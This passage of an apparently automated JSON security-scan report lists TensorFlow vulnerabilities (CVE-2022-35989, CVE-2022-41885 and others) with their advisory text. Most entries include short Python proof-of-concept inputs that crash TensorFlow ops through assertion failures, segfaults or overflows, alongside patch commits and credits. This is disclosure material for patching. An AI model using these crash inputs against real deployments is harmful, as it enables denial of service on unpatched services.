                "markdown": "**Vulnerability CVE-2022-35989**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35989](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35989)|\n\n### Impact\nWhen `MaxPool` receives a window size input array `ksize` with dimensions greater than its input tensor `input`, the GPU kernel gives a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np\n\ninput = np.ones([1, 1, 1, 1])\nksize = [1, 1, 2, 2]\nstrides = [1, 1, 1, 1]\npadding = `VALID`\ndata_format = `NCHW`\n\ntf.raw_ops.MaxPool(input=input, ksize=ksize, strides=strides, padding=padding, data_format=data_format)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [32d7bd3defd134f21a4e344c8dfd40099aaf6b18](https://github.com/tensorflow/tensorflow/commit/32d7bd3defd134f21a4e344c8dfd40099aaf6b18).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Jingyi Shi.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36027",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36027"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36027",
              "help": {
                "text": "Vulnerability CVE-2022-36027\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36027](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36027)\n### Impact\nWhen converting transposed convolutions using per-channel weight quantization the converter segfaults and crashes the Python process.\n```python\nimport tensorflow as tf\n\nclass QuantConv2DTransposed(tf.keras.layers.Layer):\n    def build(self, input_shape):\n        self.kernel = self.add_weight(\"kernel\", [3, 3, input_shape[-1], 24])\n\n    def call(self, inputs):\n        filters = tf.quantization.fake_quant_with_min_max_vars_per_channel(\n            self.kernel, -3.0 * tf.ones([24]), 3.0 * tf.ones([24]), narrow_range=True\n        )\n        filters = tf.transpose(filters, (0, 1, 3, 2))\n        return tf.nn.conv2d_transpose(inputs, filters, [*inputs.shape[:-1], 24], 1)\n\ninp = tf.keras.Input(shape=(6, 8, 48), batch_size=1)\nx = tf.quantization.fake_quant_with_min_max_vars(inp, -3.0, 3.0, narrow_range=True)\nx = QuantConv2DTransposed()(x)\nx = tf.quantization.fake_quant_with_min_max_vars(x, -3.0, 3.0, narrow_range=True)\n\nmodel = tf.keras.Model(inp, x)\n\nmodel.save(\"/tmp/testing\")\nconverter = tf.lite.TFLiteConverter.from_saved_model(\"/tmp/testing\")\nconverter.optimizations = [tf.lite.Optimize.DEFAULT]\n\n# terminated by signal SIGSEGV (Address boundary error)\ntflite_model = converter.convert()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [aa0b852a4588cea4d36b74feb05d93055540b450](https://github.com/tensorflow/tensorflow/commit/aa0b852a4588cea4d36b74feb05d93055540b450).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Lukas Geiger via [Github issue](https://github.com/tensorflow/tensorflow/issues/53767).\n",
                "markdown": "**Vulnerability CVE-2022-36027**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36027](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36027)|\n\n### Impact\nWhen converting transposed convolutions using per-channel weight quantization the converter segfaults and crashes the Python process.\n```python\nimport tensorflow as tf\n\nclass QuantConv2DTransposed(tf.keras.layers.Layer):\n    def build(self, input_shape):\n        self.kernel = self.add_weight(\"kernel\", [3, 3, input_shape[-1], 24])\n\n    def call(self, inputs):\n        filters = tf.quantization.fake_quant_with_min_max_vars_per_channel(\n            self.kernel, -3.0 * tf.ones([24]), 3.0 * tf.ones([24]), narrow_range=True\n        )\n        filters = tf.transpose(filters, (0, 1, 3, 2))\n        return tf.nn.conv2d_transpose(inputs, filters, [*inputs.shape[:-1], 24], 1)\n\ninp = tf.keras.Input(shape=(6, 8, 48), batch_size=1)\nx = tf.quantization.fake_quant_with_min_max_vars(inp, -3.0, 3.0, narrow_range=True)\nx = QuantConv2DTransposed()(x)\nx = tf.quantization.fake_quant_with_min_max_vars(x, -3.0, 3.0, narrow_range=True)\n\nmodel = tf.keras.Model(inp, x)\n\nmodel.save(\"/tmp/testing\")\nconverter = tf.lite.TFLiteConverter.from_saved_model(\"/tmp/testing\")\nconverter.optimizations = [tf.lite.Optimize.DEFAULT]\n\n# terminated by signal SIGSEGV (Address boundary error)\ntflite_model = converter.convert()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [aa0b852a4588cea4d36b74feb05d93055540b450](https://github.com/tensorflow/tensorflow/commit/aa0b852a4588cea4d36b74feb05d93055540b450).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Lukas Geiger via [Github issue](https://github.com/tensorflow/tensorflow/issues/53767).\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35995",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35995"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35995",
              "help": {
                "text": "Vulnerability CVE-2022-35995\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35995](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35995)\n### Impact\nWhen `AudioSummaryV2` receives an input `sample_rate` with more than one element, it gives a `CHECK` fails that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=``\narg_1=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_2=tf.random.uniform(shape=(2,1), dtype=tf.float32, maxval=None)\narg_3=3\narg_4=``\ntf.raw_ops.AudioSummaryV2(tag=arg_0, tensor=arg_1, sample_rate=arg_2,\n                          max_outputs=arg_3, name=arg_4)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [bf6b45244992e2ee543c258e519489659c99fb7f](https://github.com/tensorflow/tensorflow/commit/bf6b45244992e2ee543c258e519489659c99fb7f).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n",
                "markdown": "**Vulnerability CVE-2022-35995**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35995](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35995)|\n\n### Impact\nWhen `AudioSummaryV2` receives an input `sample_rate` with more than one element, it gives a `CHECK` fails that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=``\narg_1=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)\narg_2=tf.random.uniform(shape=(2,1), dtype=tf.float32, maxval=None)\narg_3=3\narg_4=``\ntf.raw_ops.AudioSummaryV2(tag=arg_0, tensor=arg_1, sample_rate=arg_2,\n                          max_outputs=arg_3, name=arg_4)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [bf6b45244992e2ee543c258e519489659c99fb7f](https://github.com/tensorflow/tensorflow/commit/bf6b45244992e2ee543c258e519489659c99fb7f).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35935",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35935"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35935",
              "help": {
                "text": "Vulnerability CVE-2022-35935\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35935](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35935)\n### Impact\nThe implementation of SobolSampleOp is vulnerable to a denial of service via CHECK-failure (assertion failure) caused by assuming `input(0)`, `input(1)`, and `input(2)` to be scalar.\n```python\nimport tensorflow as tf\ntf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))\n```\n\n### Patches\nWe have patched the issue in GitHub commit [c65c67f88ad770662e8f191269a907bf2b94b1bf](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf).\n\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by:\n- Kang Hong Jin from Singapore Management University\n- Neophytos Christou, Secure Systems Labs, Brown University\n- 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology\n",
                "markdown": "**Vulnerability CVE-2022-35935**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35935](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35935)|\n\n### Impact\nThe implementation of SobolSampleOp is vulnerable to a denial of service via CHECK-failure (assertion failure) caused by assuming `input(0)`, `input(1)`, and `input(2)` to be scalar.\n```python\nimport tensorflow as tf\ntf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))\n```\n\n### Patches\nWe have patched the issue in GitHub commit [c65c67f88ad770662e8f191269a907bf2b94b1bf](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf).\n\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by:\n- Kang Hong Jin from Singapore Management University\n- Neophytos Christou, Secure Systems Labs, Brown University\n- 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35939",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35939"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35939",
              "help": {
                "text": "Vulnerability CVE-2022-35939\nSeverity: high\nFixed Version: 2.9.1\nLink: [CVE-2022-35939](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35939)\n### Impact\nThe [`ScatterNd`](https://github.com/tensorflow/tensorflow/blob/266558ac4c1f361e9a178ee9d3f0ce2e648ae499/tensorflow/lite/kernels/internal/reference/reference_ops.h#L659-L698) function takes an input argument that determines the indices of of the output tensor. An input index greater than the output tensor or less than zero will either write content at the wrong index or trigger a crash.\n\n### Patches\nWe have patched the issue in GitHub commit [b4d4b4cb019bd7240a52daa4ba61e3cc814f0384](https://github.com/tensorflow/tensorflow/commit/b4d4b4cb019bd7240a52daa4ba61e3cc814f0384).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Hui Peng from Baidu Security.",
                "markdown": "**Vulnerability CVE-2022-35939**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.9.1|[CVE-2022-35939](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35939)|\n\n### Impact\nThe [`ScatterNd`](https://github.com/tensorflow/tensorflow/blob/266558ac4c1f361e9a178ee9d3f0ce2e648ae499/tensorflow/lite/kernels/internal/reference/reference_ops.h#L659-L698) function takes an input argument that determines the indices of of the output tensor. An input index greater than the output tensor or less than zero will either write content at the wrong index or trigger a crash.\n\n### Patches\nWe have patched the issue in GitHub commit [b4d4b4cb019bd7240a52daa4ba61e3cc814f0384](https://github.com/tensorflow/tensorflow/commit/b4d4b4cb019bd7240a52daa4ba61e3cc814f0384).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Hui Peng from Baidu Security."
              },
              "properties": {
                "security-severity": "7.0",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-36004",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36004"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36004",
              "help": {
                "text": "Vulnerability CVE-2022-36004\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36004](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36004)\n### Impact\nWhen `tf.random.gamma` receives large input shape and rates, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)\narg_1=tf.random.uniform(shape=(4, 4), dtype=tf.float64, maxval=None)\narg_2=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float64, maxval=None)\narg_3=tf.float64\narg_4=48\narg_5=`None`\ntf.random.gamma(shape=arg_0, alpha=arg_1, beta=arg_2, dtype=arg_3, seed=arg_4, name=arg_5)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [552bfced6ce4809db5f3ca305f60ff80dd40c5a3](https://github.com/tensorflow/tensorflow/commit/552bfced6ce4809db5f3ca305f60ff80dd40c5a3).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n",
                "markdown": "**Vulnerability CVE-2022-36004**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36004](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36004)|\n\n### Impact\nWhen `tf.random.gamma` receives large input shape and rates, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)\narg_1=tf.random.uniform(shape=(4, 4), dtype=tf.float64, maxval=None)\narg_2=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float64, maxval=None)\narg_3=tf.float64\narg_4=48\narg_5=`None`\ntf.random.gamma(shape=arg_0, alpha=arg_1, beta=arg_2, dtype=arg_3, seed=arg_4, name=arg_5)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [552bfced6ce4809db5f3ca305f60ff80dd40c5a3](https://github.com/tensorflow/tensorflow/commit/552bfced6ce4809db5f3ca305f60ff80dd40c5a3).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35964",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35964"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35964",
              "help": {
                "text": "Vulnerability CVE-2022-35964\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35964](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35964)\n### Impact\nThe implementation of `BlockLSTMGradV2` does not fully validate its inputs.\n - `wci`, `wcf`, `wco`, `b` must be rank 1\n - `w`, cs_prev`, `h_prev` must be rank 2\n - `x` must be rank 3\nThis results in a a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nuse_peephole = False\nseq_len_max = tf.constant(1, shape=[], dtype=tf.int64)\nx = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nw = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwcf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nb = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ni = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\no = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ntf.raw_ops.BlockLSTMGradV2(seq_len_max=seq_len_max, x=x, cs_prev=cs_prev, h_prev=h_prev, w=w, wci=wci, wcf=wcf, wco=wco, b=b, i=i, cs=cs, f=f, o=o, ci=ci, co=co, h=h, cs_grad=cs_grad, h_grad=h_grad, use_peephole=use_peephole)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [2a458fc4866505be27c62f81474ecb2b870498fa](https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",
                "markdown": "**Vulnerability CVE-2022-35964**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35964](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35964)|\n\n### Impact\nThe implementation of `BlockLSTMGradV2` does not fully validate its inputs.\n - `wci`, `wcf`, `wco`, `b` must be rank 1\n - `w`, cs_prev`, `h_prev` must be rank 2\n - `x` must be rank 3\nThis results in a a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nuse_peephole = False\nseq_len_max = tf.constant(1, shape=[], dtype=tf.int64)\nx = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nw = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwcf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nwco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nb = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ni = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\no = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ncs_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\nh_grad = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)\ntf.raw_ops.BlockLSTMGradV2(seq_len_max=seq_len_max, x=x, cs_prev=cs_prev, h_prev=h_prev, w=w, wci=wci, wcf=wcf, wco=wco, b=b, i=i, cs=cs, f=f, o=o, ci=ci, co=co, h=h, cs_grad=cs_grad, h_grad=h_grad, use_peephole=use_peephole)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [2a458fc4866505be27c62f81474ecb2b870498fa](https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University."
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41885",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41885"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41885",
              "help": {
                "text": "Vulnerability CVE-2022-41885\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-41885](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41885)\n### Impact\nWhen [`tf.raw_ops.FusedResizeAndPadConv2D`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/conv_ops_fused_image_transform.cc) is given a large tensor shape, it overflows.\n```python\nimport tensorflow as tf\n\nmode = \"REFLECT\"\nstrides = [1, 1, 1, 1]\npadding = \"SAME\"\nresize_align_corners = False\ninput = tf.constant(147, shape=[3,3,1,1], dtype=tf.float16)\nsize = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)\npaddings = tf.constant([3,4], shape=[2], dtype=tf.int32)\nfilter = tf.constant(123, shape=[1,3,4,1], dtype=tf.float16)\ntf.raw_ops.FusedResizeAndPadConv2D(input=input, size=size, paddings=paddings, filter=filter, mode=mode, strides=strides, padding=padding, resize_align_corners=resize_align_corners)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [d66e1d568275e6a2947de97dca7a102a211e01ce](https://github.com/tensorflow/tensorflow/commit/d66e1d568275e6a2947de97dca7a102a211e01ce).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-41885**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-41885](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41885)|\n\n### Impact\nWhen [`tf.raw_ops.FusedResizeAndPadConv2D`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/conv_ops_fused_image_transform.cc) is given a large tensor shape, it overflows.\n```python\nimport tensorflow as tf\n\nmode = \"REFLECT\"\nstrides = [1, 1, 1, 1]\npadding = \"SAME\"\nresize_align_corners = False\ninput = tf.constant(147, shape=[3,3,1,1], dtype=tf.float16)\nsize = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)\npaddings = tf.constant([3,4], shape=[2], dtype=tf.int32)\nfilter = tf.constant(123, shape=[1,3,4,1], dtype=tf.float16)\ntf.raw_ops.FusedResizeAndPadConv2D(input=input, size=size, paddings=paddings, filter=filter, mode=mode, strides=strides, padding=padding, resize_align_corners=resize_align_corners)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [d66e1d568275e6a2947de97dca7a102a211e01ce](https://github.com/tensorflow/tensorflow/commit/d66e1d568275e6a2947de97dca7a102a211e01ce).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41909",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41909"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41909",
              "help": {
                "text": "Vulnerability CVE-2022-41909\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41909](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41909)\n### Impact\nAn input `encoded` that is not a valid `CompositeTensorVariant` tensor will trigger a segfault in [`tf.raw_ops.CompositeTensorVariantToComponents`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/lib/core/py_func.cc).\n\n```python\nimport tensorflow as tf\n\nencode = tf.raw_ops.EmptyTensorList(element_dtype=tf.int32, element_shape=[10, 15], max_num_elements=2)\nmeta= \"\"\ncomponent=[tf.int32]\n\nprint(tf.raw_ops.CompositeTensorVariantToComponents(encoded=encode,metadata=meta,Tcomponents=component))\n```\n\n### Patches\nWe have patched the issue in GitHub commits [bf594d08d377dc6a3354d9fdb494b32d45f91971](https://github.com/tensorflow/tensorflow/commit/bf594d08d377dc6a3354d9fdb494b32d45f91971) and [660ce5a89eb6766834bdc303d2ab3902aef99d3d](https://github.com/tensorflow/tensorflow/commit/660ce5a89eb6766834bdc303d2ab3902aef99d3d).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### 